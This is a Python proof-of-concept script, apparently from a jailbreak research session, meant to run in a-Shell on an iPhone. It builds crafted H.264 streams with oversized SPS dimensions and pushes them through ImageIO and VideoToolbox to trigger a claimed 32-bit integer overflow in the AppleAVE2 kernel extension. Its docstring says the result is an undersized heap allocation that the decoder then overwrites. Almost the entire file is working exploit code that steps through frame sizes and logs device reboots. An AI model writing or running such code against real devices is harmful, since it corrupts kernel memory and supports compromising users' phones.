#!/usr/bin/env python3
"""
oc_vtdec_ceiling.py  (O-C = session "jailbreak 3") - runs inside a-Shell on the iPhone.

Two routes to the same question, because they fail differently:

ROUTE A (ImageIO, simple, preferred): write the crafted Annex-B H.264 into
/var/mobile/Media/Downloads and ask ImageIO for the FULL image
(CGImageSourceCreateImageAtIndex). ImageIO sniffs the content, hands the stream
to VideoToolbox, VT hands it to mediaserverd, and mediaserverd drives
AppleAVE2 - the kext reads our SPS and computes the frame size with the 32-bit
multiply (width*height) that has only a NEGATIVE check. 4097 MBs -> 65552x65552
px -> exact 4297064704 -> 32-bit 2097408 -> a 2 MB allocation for a 4.3 GB
picture. The decoder then writes the picture over the heap.
No sample buffers, no avcC, no ABI guessing - three ctypes calls.

ROUTE B (VideoToolbox direct, for the client-side gate measurement):
VTDecompressionSessionCreate with a format description built from our SPS tells
us whether the CLIENT refuses the size before the kext ever sees it. We try
several CMSampleBuffer arities at runtime because the SDK signature moved
between releases.

Output: stdout + /var/mobile/Media/Downloads/oc_vtdec_out.txt, and the rig
collects the file afterwards.
"""
import ctypes
import os
import sys
import time

DL = "/var/mobile/Media/Downloads"
OUTS = [os.path.join(DL, "oc_vtdec_out.txt"),
        os.path.join(os.getcwd(), "oc_vtdec_out.txt")]
log = []


def say(s):
    s = str(s)
    log.append(s)
    try:
        sys.stdout.write(s + "\n")
        sys.stdout.flush()
    except Exception:
        pass
    for p in OUTS:
        try:
            f = open(p, "a")
            f.write(s + "\n")
            f.flush()
            f.close()
            break
        except Exception:
            pass


# ----------------------------------------------------------------- bit writer
class BW:
    def __init__(self):
        self.buf = bytearray(64)
        self.bit = 0

    def _ensure(self, n):
        if len(self.buf) < n:
            self.buf.extend(b"\x00" * (n - len(self.buf)))

    def b(self, v):
        self._ensure((self.bit >> 3) + 1)
        if v:
            self.buf[self.bit >> 3] |= 0x80 >> (self.bit & 7)
        self.bit += 1

    def u(self, n, v):
        for i in range(n - 1, -1, -1):
            self.b((v >> i) & 1)

    def ue(self, v):
        code = v + 1
        n = code.bit_length() - 1
        for _ in range(n):
            self.b(0)
        self.u(n + 1, code)

    def trailing(self):
        self.b(1)
        while self.bit & 7:
            self.b(0)

    def bytes(self):
        return bytes(self.buf[:(self.bit + 7) // 8])


def make_sps(mb_w, mb_h, level=51):
    w = BW()
    w.u(8, (3 << 5) | 25)
    w.u(8, 66); w.u(8, 0); w.u(8, level)
    w.ue(0); w.ue(0); w.ue(2); w.ue(1)
    w.b(0)
    w.ue(mb_w - 1)
    w.ue(mb_h - 1)
    w.b(1); w.b(1); w.b(0); w.b(0)
    w.trailing()
    return w.bytes()


def make_pps():
    w = BW()
    w.u(8, (3 << 5) | 8)
    w.ue(0); w.ue(0); w.b(0); w.b(0); w.ue(0); w.ue(0); w.ue(0)
    w.b(0); w.u(2, 0); w.u(2, 0); w.b(0); w.b(0); w.b(1); w.b(0); w.b(0)
    w.trailing()
    return w.bytes()


def make_idr():
    w = BW()
    w.u(8, (3 << 5) | 5)
    w.ue(0); w.ue(7); w.ue(0); w.u(4, 0); w.ue(0); w.ue(0)
    w.ue(1); w.ue(0); w.ue(0); w.ue(25)
    w.trailing()
    return w.bytes()


def stream(mb_w, mb_h):
    out = bytearray()
    for nal in (make_sps(mb_w, mb_h), make_pps(), make_idr()):
        out += b"\x00\x00\x00\x01" + nal
    return bytes(out)


try:
    cf = ctypes.CDLL("/System/Library/Frameworks/CoreFoundation.framework/CoreFoundation")
    img = ctypes.CDLL("/System/Library/Frameworks/ImageIO.framework/ImageIO")
    vt = ctypes.CDLL("/System/Library/Frameworks/VideoToolbox.framework/VideoToolbox")
except Exception as e:
    say("LOAD FAILED: %r" % (e,))
    raise SystemExit(1)

cf.CFURLCreateWithFileSystemPath.restype = ctypes.c_void_p
cf.CFURLCreateWithFileSystemPath.argtypes = [ctypes.c_void_p, ctypes.c_char_p,
                                             ctypes.c_long, ctypes.c_bool]
cf.CFRelease.argtypes = [ctypes.c_void_p]
img.CGImageSourceCreateWithURL.restype = ctypes.c_void_p
img.CGImageSourceCreateWithURL.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
img.CGImageSourceGetCount.restype = ctypes.c_long
img.CGImageSourceGetCount.argtypes = [ctypes.c_void_p]
img.CGImageSourceCreateImageAtIndex.restype = ctypes.c_void_p
img.CGImageSourceCreateImageAtIndex.argtypes = [ctypes.c_void_p, ctypes.c_long, ctypes.c_void_p]
img.CGImageSourceCreateThumbnailAtIndex.restype = ctypes.c_void_p
img.CGImageSourceCreateThumbnailAtIndex.argtypes = [ctypes.c_void_p, ctypes.c_long, ctypes.c_void_p]
img.CGImageGetWidth.restype = ctypes.c_long
img.CGImageGetWidth.argtypes = [ctypes.c_void_p]
img.CGImageGetHeight.restype = ctypes.c_long
img.CGImageGetHeight.argtypes = [ctypes.c_void_p]

kCFURLPOSIXPathStyle = 0


def imageio_route(mb_w, mb_h, path):
    """Full decode through ImageIO. This is the one that fires the kext."""
    url = cf.CFURLCreateWithFileSystemPath(None, path.encode(), kCFURLPOSIXPathStyle, False)
    if not url:
        say("   CFURLCreateWithFileSystemPath failed")
        return
    src = img.CGImageSourceCreateWithURL(url, None)
    if not src:
        say("   CGImageSourceCreateWithURL returned NULL (ImageIO rejected the stream)")
        cf.CFRelease(url)
        return
    n = img.CGImageSourceGetCount(src)
    say("   ImageIO accepted the stream: %d frame(s)" % n)
    say("   calling CGImageSourceCreateImageAtIndex (FULL decode -> real frame allocation)")
    im = img.CGImageSourceCreateImageAtIndex(src, 0, None)
    if im:
        say("   SURVIVED full decode: %dx%d" % (img.CGImageGetWidth(im), img.CGImageGetHeight(im)))
    else:
        say("   full decode returned NULL (decoder refused or failed)")
    cf.CFRelease(src)
    cf.CFRelease(url)


def vt_gate(mb_w, mb_h):
    """Client-side gate measurement: can a decompression session even be created?"""
    try:
        cm = ctypes.CDLL("/System/Library/Frameworks/CoreMedia.framework/CoreMedia")
    except Exception as e:
        say("   CoreMedia load failed: %r" % (e,))
        return
    sps = make_sps(mb_w, mb_h)
    pps = make_pps()
    # avcC record
    avcc = bytearray()
    avcc += bytes([1, sps[1], sps[2], sps[3], 0xFF, 0xE1,
                    (len(sps) >> 8) & 0xFF, len(sps) & 0xFF]) + sps
    avcc += bytes([1, (len(pps) >> 8) & 0xFF, len(pps) & 0xFF]) + pps
    avcc = bytes(avcc)
    H264 = 0x61766331
    fmt = ctypes.c_void_p()
    ok = False
    for args in (                       # the SDK moved the allocator out of this call
            (H264, mb_w * 16, mb_h * 16, avcc, len(avcc), ctypes.byref(fmt)),
            (None, H264, mb_w * 16, mb_h * 16, avcc, len(avcc), ctypes.byref(fmt)),
            (None, H264, mb_w * 16, mb_h * 16, avcc, len(avcc), ctypes.byref(fmt), None)):
        try:
            cm.CMVideoFormatDescriptionCreate.restype = ctypes.c_int32
            st = cm.CMVideoFormatDescriptionCreate(*args)
            say("   CMVideoFormatDescriptionCreate(%d args) st=%d" % (len(args), st))
            if st == 0:
                ok = True
                break
        except Exception as e:
            say("   CMVideoFormatDescriptionCreate with %d args: %s" % (len(args), str(e)[:80]))
    if not ok:
        return
    sess = ctypes.c_void_p()
    try:
        vt.VTDecompressionSessionCreate.restype = ctypes.c_int32
        for args in ((None, fmt, None, None, None, ctypes.byref(sess)),
                     (None, fmt, None, None, ctypes.byref(sess))):
            try:
                st = vt.VTDecompressionSessionCreate(*args)
                say("   VTDecompressionSessionCreate(%d args) st=%d  <-- client-side gate"
                    % (len(args), st))
                if st == 0:
                    break
            except Exception as e:
                say("   VTDecompressionSessionCreate with %d args: %s" % (len(args), str(e)[:80]))
    except Exception as e:
        say("   VTDecompressionSessionCreate: %r" % (e,))


LADDER = [(4096, 4096), (4097, 4097), (4098, 4098), (4099, 4099),
          (2048, 4097), (4097, 2048), (3072, 4097), (4097, 3072),
          (1024, 4097), (4097, 1024), (256, 256), (128, 128)]

say("=== oc_vtdec_ceiling %s ===" % time.strftime("%H:%M:%S"))
say("crafted stream: SPS claims pic_width_in_mbs_minus1 = %d" % (LADDER[0][0] - 1))
for (w, h) in LADDER:
    px = (w * 16) * (h * 16)
    prod = px & 0xFFFFFFFF
    signed = prod - (1 << 32) if prod & 0x80000000 else prod
    say("--- %d x %d MBs = %d x %d px | exact %d | 32-bit %d | signed %d%s ---"
        % (w, h, w * 16, h * 16, px, prod, signed,
           "  <== WRAPS TO A SMALL POSITIVE" if 0 < signed < 0x10000000 else ""))
    data = stream(w, h)
    path = os.path.join(DL, "oc_%d_%d.h264" % (w, h))
    try:
        with open(path, "wb") as f:
            f.write(data)
        say("   wrote %s (%d bytes)" % (path, len(data)))
    except Exception as e:
        say("   could not write %s: %r" % (path, e))
        continue
    vt_gate(w, h)
    imageio_route(w, h, path)
    if w == LADDER[0][0] and h == LADDER[0][1]:
        say("   (if the phone reboots or this file stops here, the kext overflowed)")
say("DONE")
